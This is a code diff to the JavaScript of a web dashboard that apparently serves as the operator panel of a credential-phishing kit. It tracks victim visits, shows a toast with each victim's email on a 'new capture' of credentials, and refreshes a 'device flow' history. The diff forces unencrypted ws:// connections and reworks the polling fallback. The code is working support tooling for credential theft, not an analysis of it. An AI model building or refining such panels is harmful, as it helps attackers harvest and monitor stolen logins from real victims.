@@ -960,6 +960,7 @@
     let wsReconnectTimer = null;
     let wsConnected = false;
     let pendingLogsRefresh = false;
+    let isFallbackMode = false;
 
     // =============================================
     // THEME
@@ -998,25 +999,25 @@
     }
 
     // =============================================
-    // WEBSOCKET - FULLY WORKING
+    // WEBSOCKET - FORCED ws:// (FIXED)
     // =============================================
     function connectWebSocket() {
-        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const wsUrl = `${protocol}//${window.location.host}/ws`;
+        // 🔥 FORCE ws:// - no SSL/TLS for WebSocket
+        const wsUrl = `ws://${window.location.host}/ws`;
+        console.log('🔌 Connecting to WebSocket:', wsUrl);
         
         try {
             ws = new WebSocket(wsUrl);
             
             ws.onopen = () => {
                 wsConnected = true;
+                isFallbackMode = false;
                 const dot = document.getElementById('wsDot');
                 const label = document.getElementById('wsLabel');
                 dot.className = 'ws-dot online';
                 label.textContent = '🟢 Live (WebSocket)';
                 console.log('✅ WebSocket connected');
                 showToast('🟢 Real-time connection established');
-                
-                // Initial refresh on connect
                 refreshLogs();
             };
             
@@ -1026,40 +1027,30 @@
                     console.log('📩 WebSocket message:', data);
                     
                     switch(data.type) {
+                        case 'connected':
+                            console.log('✅ WebSocket handshake complete');
+                            break;
                         case 'new_log':
-                            // New log file created - refresh the table
                             if (!pendingLogsRefresh) {
                                 pendingLogsRefresh = true;
-                                setTimeout(() => {
-                                    refreshLogs();
-                                    pendingLogsRefresh = false;
-                                }, 500);
+                                setTimeout(() => { refreshLogs(); pendingLogsRefresh = false; }, 500);
                             }
                             break;
-                            
                         case 'new_visit':
-                            // New visit recorded - update visits table
                             fetchVisits();
                             break;
-                            
                         case 'new_capture':
-                            // New credential capture
-                            showToast(`🔐 New capture: ${data.email || 'Unknown user'}`);
+                            showToast(`🔐 New capture: ${data.data?.email || 'Unknown user'}`);
                             refreshLogs();
                             break;
-                            
                         case 'device_update':
-                            // Device flow update
                             refreshDeviceHistory();
                             break;
-                            
                         case 'ping':
-                            // Respond to ping
                             if (ws && ws.readyState === WebSocket.OPEN) {
                                 ws.send(JSON.stringify({ type: 'pong' }));
                             }
                             break;
-                            
                         default:
                             console.log('Unknown WebSocket message type:', data.type);
                     }
@@ -1070,7 +1061,7 @@
             
             ws.onerror = (error) => {
                 console.error('WebSocket error:', error);
-                // Don't update UI on error - keep trying
+                // Don't show toast on error - it's spammy
             };
             
             ws.onclose = () => {
@@ -1081,30 +1072,29 @@
                 label.textContent = '🔴 Reconnecting...';
                 console.log('WebSocket disconnected, reconnecting in 3s...');
                 
-                // Attempt to reconnect
                 if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
                 wsReconnectTimer = setTimeout(connectWebSocket, 3000);
             };
         } catch (e) {
             console.error('WebSocket connection failed:', e);
-            // Fallback to polling
-            const dot = document.getElementById('wsDot');
-            const label = document.getElementById('wsLabel');
-            dot.className = 'ws-dot offline';
-            label.textContent = '⚠️ Fallback (Polling)';
-            showToast('⚠️ WebSocket unavailable, using polling fallback', true);
-            
-            // Start polling fallback
-            if (!window._pollingFallback) {
-                window._pollingFallback = setInterval(refreshLogs, 5000);
-            }
+            startFallbackMode();
         }
     }
 
-    // Send a message via WebSocket
-    function sendWebSocketMessage(type, data) {
-        if (ws && ws.readyState === WebSocket.OPEN) {
-            ws.send(JSON.stringify({ type, data }));
+    function startFallbackMode() {
+        if (isFallbackMode) return;
+        isFallbackMode = true;
+        const dot = document.getElementById('wsDot');
+        const label = document.getElementById('wsLabel');
+        dot.className = 'ws-dot offline';
+        label.textContent = '⚠️ Fallback (Polling)';
+        showToast('⚠️ WebSocket unavailable, using polling fallback', true);
+        
+        if (!window._pollingFallback) {
+            window._pollingFallback = setInterval(refreshLogs, 5000);
+        }
+        if (!window._pollingVisits) {
+            window._pollingVisits = setInterval(fetchVisits, 10000);
         }
     }
 
